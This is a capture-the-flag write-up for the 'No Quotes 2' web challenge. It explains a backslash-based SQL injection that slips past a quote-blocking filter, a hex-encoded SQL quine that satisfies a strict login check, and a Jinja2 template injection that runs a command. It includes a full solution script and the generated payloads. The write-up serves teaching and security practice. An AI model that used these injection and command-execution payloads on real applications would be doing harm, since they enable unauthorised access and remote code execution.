# No Quotes 2

**Difficulty:** Hard but Fun

### 1. Challenge Overview

We are given a Flask web application with the following source files:

* **`app.py`**: The main web server logic.
* **`readflag.c`**: A C program that sets UID to root and reads the flag.
* **`entrypoint.sh`**: Setup script showing the database initialization.

The Goal: We need to execute the /readflag binary to get the flag.

The Obstacles:

1. **WAF:** A `waf()` function blocks all single (`'`) and double (`"`) quotes.

```python
def waf(value: str) -> bool:
	blacklist = ["'", '"']
	return any(char in value for char in blacklist)
```

2. **Strict Login Check:** To log in, the database must return a row where `username` and `password` **exactly match** the input we sent.

```python
if not username == row[0] or not password == row[1]:
	return render_template(
		"login.html",
		error="Invalid credentials.",
		username=username,
	)
```

***

### 2. Vulnerability Analysis

#### The SQL Injection (The "Swallow")

The application constructs the SQL query using Python f-strings, which is vulnerable to SQL Injection:

```python
query = (
    "SELECT username, password FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

Normally, you would inject a quote `'` to break out of the string. However, the WAF forbids quotes.

The Bypass: We can use a backslash ().

In SQL, a backslash escapes the character immediately following it. If we send a username ending in , it will escape the closing quote of the username field.

* **Input Username:** `payload\`
* **Resulting Query:**

```sql
WHERE username = ('payload\') AND password = ('injection')
```

The database interprets `'payload\') AND password = ('` as a **single string**. The query "swallows" the middle section, effectively merging the username and password fields. This leaves our input for `password` exposed as raw SQL!

#### The "Double Check" (The Logic Puzzle)

After the query runs, the app performs this check:

```python
if not username == row[0] or not password == row[1]:
    return render_template("login.html", error="Invalid credentials.")
```

This is the hardest part of the challenge.

* We are injecting malicious SQL into the `password` field.
* The database executes that SQL.
* The result (`row[1]`) must be **identical** to our input (`password`).

We need a query that outputs its own source code. In computer science, this is called a **Quine**.

#### Server-Side Template Injection (SSTI)

Once logged in, the application renders the home page:

```python
return render_template_string(open("templates/home.html").read() % session["user"])
```

It formats the template string _before_ rendering it with **Jinja2**. If `session["user"]` contains template syntax (like `{{ ... }}`), the server will execute it. This is our path to Remote Code Execution (RCE).

***

### 3. Constructing the Exploit

We need to chain these techniques: **SSTI** payload inside a **SQL Swallow** injection, validated by a **SQL Quine**.

#### Step 1: The SSTI Payload (The Username)

We need to run `/readflag`. Usually, we'd do `popen('/readflag')`. But we can't use quotes!

Trick: Pass the strings as URL parameters (?c=/readflag\&k=os).

Inside the template, we can access request.args.

* `request.args` is a dictionary-like object.
* `request.args|list` gives us the keys `['os', '/readflag']`.
* `|max` gives `'os'`.
* `|min` gives `'/readflag'`.

**Payload:**

```python
{{ config.__class__.__init__.__globals__[request.args|list|max].popen(request.args|list|min).read() }}\
```

_Note the trailing `\` to trigger the SQL swallow._

#### Step 2: The Quine (The Password)

We need a SQL statement `P` such that executing `P` returns `P`.

**Standard SQL Quine Technique:**

```sql
SELECT REPLACE(Template, Placeholder, Template)
```

However, we face a specific issue here: Hex Encoding.

To bypass the WAF, we have to hex-encode our strings in the injection (e.g., 0x61 instead of 'a').

* **Input:** We send a string containing `0x...` (literal hex representation).
* **Execution:** SQL converts `0x...` into the ASCII character.
* **Mismatch:** Input (`0x61`) != Output (`a`).

The Fix: We must force SQL to output the hex representation of the string so it matches our input.

We use: CONCAT(0x3078, LOWER(HEX(...)))

* `0x3078` is "0x".
* `HEX(...)` converts the string back to hex.
* `LOWER(...)` ensures it matches Python's lowercase hex format.

**The Quine Query Structure:**

```
) UNION SELECT <User_Hex>, REPLACE($, 0x24, CONCAT(0x3078, LOWER(HEX($))))#
```

1. `)` closes the swallowed username field.
2. `UNION SELECT` lets us define the returned row.
3. `<User_Hex>` returns our SSTI payload (satisfying `username == row[0]`).
4. The `REPLACE` function takes a template (where `$` is a placeholder) and replaces the `$` with the hex-encoded version of the template itself.

***

### 4. The Solution Script

Here is the Python script that automates the generation of the Quine.

```python
import binascii

def to_hex(s):
    return binascii.hexlify(s.encode()).decode()

def solve():
    # --- 1. Crafting the Username (SSTI) ---
    # We use request.args to inject strings without quotes.
    # The trailing backslash (\) triggers the SQL 'Swallow'.
    ssti_payload = "{{ config.__class__.__init__.__globals__[request.args|list|max].popen(request.args|list|min).read() }}\\"
    
    # Hex encode the username for the SQL query
    u_hex = "0x" + to_hex(ssti_payload)

    # --- 2. Crafting the Password (Quine) ---
    # We need: Input Password == Database Output
    # The template uses '$' (0x24) as a placeholder.
    # It reconstructs itself using CONCAT('0x', HEX(template)).
    template = f") UNION SELECT {u_hex}, REPLACE($, 0x24, CONCAT(0x3078, LOWER(HEX($))))#"
    
    # Calculate the hex of the template itself
    h = "0x" + to_hex(template)
    
    # Replace the placeholder '$' with the actual hex string
    final_password = template.replace("$", h)

    # --- 3. Execution ---
    # Parameters to bypass WAF for strings 'os' and '/readflag'
    params = [('/readflag', '1'), ('os', '1')]
    
    data = {
        "username": ssti_payload,
        "password": final_password
    }

    print(data)

if __name__ == "__main__":
    solve()
```

## 5. The Winning Query

Running the script generates the crafted Quine query to use for attacking.

```json
{
	'username': '{{ config.__class__.__init__.__globals__[request.args|list|max].popen(request.args|list|min).read() }}\\', 
	'password': ') UNION SELECT 0x7b7b20636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b726571756573742e617267737c6c6973747c6d61785d2e706f70656e28726571756573742e617267737c6c6973747c6d696e292e726561642829207d7d5c, REPLACE(0x2920554e494f4e2053454c45435420307837623762323036333666366536363639363732653566356636333663363137333733356635663265356635663639366536393734356635663265356635663637366336663632363136633733356635663562373236353731373536353733373432653631373236373733376336633639373337343763366436313738356432653730366637303635366532383732363537313735363537333734326536313732363737333763366336393733373437633664363936653239326537323635363136343238323932303764376435632c205245504c41434528242c20307832342c20434f4e434154283078333037382c204c4f5745522848455828242929292923, 0x24, CONCAT(0x3078, LOWER(HEX(0x2920554e494f4e2053454c45435420307837623762323036333666366536363639363732653566356636333663363137333733356635663265356635663639366536393734356635663265356635663637366336663632363136633733356635663562373236353731373536353733373432653631373236373733376336633639373337343763366436313738356432653730366637303635366532383732363537313735363537333734326536313732363737333763366336393733373437633664363936653239326537323635363136343238323932303764376435632c205245504c41434528242c20307832342c20434f4e434154283078333037382c204c4f5745522848455828242929292923))))#'
}
```

Now, if we submitted this to the form, the query would become like this:

```sql
SELECT username, password FROM users WHERE username = ('{{ config.__class__.__init__.__globals__[request.args|list|max].popen(request.args|list|min).read() }}\') AND password = (') UNION SELECT 0x7b7b20636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b726571756573742e617267737c6c6973747c6d61785d2e706f70656e28726571756573742e617267737c6c6973747c6d696e292e726561642829207d7d5c, REPLACE(0x2920554e494f4e2053454c45435420307837623762323036333666366536363639363732653566356636333663363137333733356635663265356635663639366536393734356635663265356635663637366336663632363136633733356635663562373236353731373536353733373432653631373236373733376336633639373337343763366436313738356432653730366637303635366532383732363537313735363537333734326536313732363737333763366336393733373437633664363936653239326537323635363136343238323932303764376435632c205245504c41434528242c20307832342c20434f4e434154283078333037382c204c4f5745522848455828242929292923, 0x24, CONCAT(0x3078, LOWER(HEX(0x2920554e494f4e2053454c45435420307837623762323036333666366536363639363732653566356636333663363137333733356635663265356635663639366536393734356635663265356635663637366336663632363136633733356635663562373236353731373536353733373432653631373236373733376336633639373337343763366436313738356432653730366637303635366532383732363537313735363537333734326536313732363737333763366336393733373437633664363936653239326537323635363136343238323932303764376435632c205245504c41434528242c20307832342c20434f4e434154283078333037382c204c4f5745522848455828242929292923))))#')
```

**Analysis of the constructed query**

I've identified that the injected backslash `\` merges the two fields.

The "Swallow" Effect:

```sql
WHERE username = ('...read() }}\') AND password = (') UNION SELECT ...
```

* **Human View:** It looks like two separate fields: `username` and `password`.
* **Database View:** Because of the escaped quote (`\'`), the database sees one massive string for the username.

> _Note that while the SQL query looks complex, the username payload `request.args|list|max` dynamically pulls the string '**os**' from our **GET** parameters (`**?os=1**`). This allows us to bypass the '**No Quotes**' restriction completely._

### 6. Result

Logging in with the query successfully bypasses the WAF, satisfies the strict login check, and executes the **readflag** binary.

**Flag:**

```
uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}
```
